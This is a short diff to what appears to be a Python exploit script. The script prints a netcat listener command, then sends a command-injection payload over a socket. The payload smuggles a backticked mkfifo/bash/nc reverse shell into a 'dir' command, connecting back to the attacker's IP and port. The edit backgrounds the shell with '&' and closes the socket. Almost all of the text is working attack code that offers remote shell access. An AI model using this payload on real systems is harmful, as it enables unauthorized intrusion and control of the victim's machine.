@@ -21,5 +21,6 @@ print(f'\nnc -nvl {LOCAL_PORT}')
 
 input(f'\nPress enter to continue...\n')
 
-s.send(f'dir `rm f;busybox mkfifo f;cat f|bash -i 2>&1|nc {LOCAL_IP} {LOCAL_PORT} >f`\r\n'.encode())
+s.send(f'dir `rm f;busybox mkfifo f;cat f|bash -i 2>&1|nc {LOCAL_IP} {LOCAL_PORT} >f &`\r\n'.encode())
 print(f'debug: {s.recv(1024).decode(errors="ignore")}')
+s.close()
